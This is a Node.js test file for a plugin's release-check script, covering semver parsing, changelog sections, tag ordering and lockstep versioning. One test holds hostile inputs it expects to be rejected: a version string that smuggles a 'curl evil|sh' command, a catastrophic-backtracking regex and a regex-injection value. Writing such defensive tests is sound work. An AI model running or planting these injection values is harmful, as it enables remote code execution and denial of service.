// check-release.test.mjs — a version bump IS the release; this fires the pure core against fixtures.
// Run: node --test scripts/check-release.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  PLUGIN,
  CHANGELOG,
  changelogSection,
  compareVersions,
  consistencyErrors,
  highestTagVersion,
  kitClosureFiles,
  newestChangelogVersion,
  parseVersion,
  pluginVersion,
  touchesShippedSurface,
} from './check-release.mjs';

// ── parseVersion / compareVersions ────────────────────────────────────────────────────────────

test('parseVersion accepts x.y.z and rejects anything else', () => {
  assert.deepEqual(parseVersion('0.1.0'), [0, 1, 0]);
  assert.deepEqual(parseVersion(' 1.2.3 '), [1, 2, 3]);
  assert.throws(() => parseVersion('v0.1.0'), /not a semver/);
  assert.throws(() => parseVersion('0.1'), /not a semver/);
  assert.throws(() => parseVersion('latest'), /not a semver/);
});

test('compareVersions is NUMERIC, not lexicographic — 0.10.0 beats 0.9.0', () => {
  assert.equal(compareVersions('0.10.0', '0.9.0'), 1);
  assert.equal(compareVersions('0.9.0', '0.10.0'), -1);
  assert.equal(compareVersions('0.1.0', '0.1.0'), 0);
  assert.equal(compareVersions('1.0.0', '0.9.9'), 1);
});

// ── pluginVersion / newestChangelogVersion ────────────────────────────────────────────────────

test('pluginVersion reads the field and throws when absent', () => {
  assert.equal(pluginVersion('{"name": "x", "version": "0.2.0"}'), '0.2.0');
  assert.throws(() => pluginVersion('{"name": "x"}'), /no version field/);
});

test('newestChangelogVersion finds the first versioned heading, skipping [Unreleased]', () => {
  const changelog = '# Changelog\n\n## [Unreleased]\n\n## [0.2.0] - 2026-10-01\n\nstuff\n\n## [0.1.0] - 2026-09-23\n';
  assert.equal(newestChangelogVersion(changelog), '0.2.0');
  assert.throws(() => newestChangelogVersion('# Changelog\n\nnothing here\n'), /no ".*" heading/);
});

test('changelogSection extracts one version\'s body, stopping at the next heading', () => {
  const changelog = [
    '# Changelog',
    '',
    '## [Unreleased]',
    '',
    '## [0.2.0] - 2026-10-01',
    '',
    '### Added',
    '',
    '- second release',
    '',
    '## [0.1.0] - 2026-09-23',
    '',
    '### Added',
    '',
    '- first release',
    '',
  ].join('\n');
  assert.equal(changelogSection(changelog, '0.2.0'), '### Added\n\n- second release');
  assert.equal(changelogSection(changelog, '0.1.0'), '### Added\n\n- first release');
  assert.throws(() => changelogSection(changelog, '9.9.9'), /no ".*" heading/);
});

// ── touchesShippedSurface ─────────────────────────────────────────────────────────────────────

test('touchesShippedSurface fires on plugins/**, kit/** and a closure member; not on docs', () => {
  const closure = new Set(['template/scripts/standup.mjs']);
  assert.equal(touchesShippedSurface(['plugins/golden-frijoles/skills/groom/SKILL.md'], closure), true);
  assert.equal(touchesShippedSurface(['kit/bin.mjs'], closure), true);
  assert.equal(touchesShippedSurface(['template/scripts/standup.mjs'], closure), true);
  assert.equal(touchesShippedSurface(['README.md', 'Roadmap/LEARNINGS.md'], closure), false);
  assert.equal(touchesShippedSurface(['template/scripts/other-script.mjs'], closure), false);
});

// ── kitClosureFiles — derived live, never a copied list ───────────────────────────────────────

test('kitClosureFiles is derived live from requires_scripts (a fixture skills/ dir), not hand-copied', () => {
  const skill = (entries) =>
    `---\nname: alpha\nrequires_scripts:\n${entries.map((e) => `  - ${e}`).join('\n')}\n---\n\n# alpha\n`;
  const dir = mkdtempSync(join(tmpdir(), 'kit-closure-'));
  mkdirSync(join(dir, 'alpha'));
  writeFileSync(join(dir, 'alpha', 'SKILL.md'), skill(['alpha.mjs', 'lib/shared.mjs']));
  const files = kitClosureFiles({ skillsDir: dir, skeleton: [] });
  assert.deepEqual([...files].sort(), ['template/scripts/alpha.mjs', 'template/scripts/lib/shared.mjs']);
  assert.ok(kitClosureFiles({ skillsDir: dir, skeleton: ['Roadmap/X.md'] }).has('template/Roadmap/X.md'), 'the skeleton joins the closure');
});

test('kitClosureFiles covers the Roadmap skeleton frijoles-kit init writes (kickoff-generator-path S2)', () => {
  const files = kitClosureFiles();
  assert.ok(files.has('template/Roadmap/WAYS-OF-WORKING.md'), 'the skeleton’s WAYS-OF-WORKING ships in the kit');
  assert.equal(touchesShippedSurface(['template/Roadmap/WAYS-OF-WORKING.md'], files), true);
  assert.equal(touchesShippedSurface(['template/Roadmap/SESSION-KICKOFFS.md'], files), false, 'not in the skeleton, not shipped by the kit');
});

test('kitClosureFiles against the REAL plugin lists every declared script under template/scripts/', () => {
  const files = kitClosureFiles({ skeleton: [] });
  assert.ok(files.size > 0, 'the real plugin declares scripts');
  assert.ok([...files].every((f) => f.startsWith('template/scripts/')), 'every entry is rooted under template/scripts/');
  assert.ok([...files].some((f) => f.endsWith('standup.mjs')), 'standup-post is one of the ten skills');
});

// ── the committed release state passes its own always-check ──────────────────────────────────

test('the committed plugin.json and CHANGELOG.md agree — the same assertion the ALWAYS check makes', () => {
  const current = pluginVersion(readFileSync(PLUGIN, 'utf8'));
  const changelog = newestChangelogVersion(readFileSync(CHANGELOG, 'utf8'));
  assert.equal(current, changelog);
});

// ── acceptance-named behaviours (sprint-1.md QA) ──────────────────────────────────────────────

test('fires on a plugin change without a bump (simulated: base version >= current)', () => {
  const closure = new Set();
  const changed = ['plugins/golden-frijoles/skills/groom/SKILL.md'];
  assert.equal(touchesShippedSurface(changed, closure), true);
  // the version-bump comparison itself: base == current is NOT a forward move.
  assert.equal(compareVersions('0.1.0', '0.1.0') <= 0, true);
});

test('does NOT fire on a docs-only change', () => {
  const closure = kitClosureFiles();
  const changed = ['Roadmap/LEARNINGS.md', 'README.md'];
  assert.equal(touchesShippedSurface(changed, closure), false);
});

test('fires on a CHANGELOG mismatch', () => {
  assert.notEqual(pluginVersion('{"version": "0.2.0"}'), newestChangelogVersion('## [0.1.0] - 2026-09-23\n'));
});

test('highestTagVersion: the highest vX.Y.Z tag by semver, ignoring anything else', () => {
  assert.equal(highestTagVersion(['v0.1.0', 'v0.10.0', 'v0.9.0', '']), '0.10.0');
  assert.equal(highestTagVersion(['v1.0.0-rc.1', 'latest', 'v0.2.0']), '0.2.0');
  assert.equal(highestTagVersion([]), null);
});

test('pluginVersion and changelogSection refuse anything but a strict x.y.z (it becomes a tag and a RegExp)', () => {
  assert.throws(() => pluginVersion(JSON.stringify({ version: '0.1.0$(curl evil|sh)' })), /not a semver/);
  assert.throws(() => pluginVersion(JSON.stringify({ version: '0.1.0(a+)+' })), /not a semver/);
  assert.throws(() => changelogSection('## [0.1.0]\nx\n', '0.1.0|.*'), /not a semver/);
  assert.equal(pluginVersion(JSON.stringify({ version: '0.1.0' })), '0.1.0');
});

test('consistencyErrors: plugin, CHANGELOG and kit move in lockstep — a plugin-only bump fails', () => {
  assert.deepEqual(consistencyErrors({ plugin: '0.2.0', changelog: '0.2.0', kit: '0.2.0' }), []);
  assert.deepEqual(consistencyErrors({ plugin: '0.1.0', changelog: '0.1.0', kit: null }), [], 'no kit yet is fine');
  const drift = consistencyErrors({ plugin: '0.2.1', changelog: '0.2.1', kit: '0.2.0' });
  assert.equal(drift.length, 1);
  assert.match(drift[0], /kit\/package\.json version "0\.2\.0" != plugin\.json version "0\.2\.1"/);
  assert.equal(consistencyErrors({ plugin: '0.2.1', changelog: '0.2.0', kit: '0.2.1' }).length, 1);
});
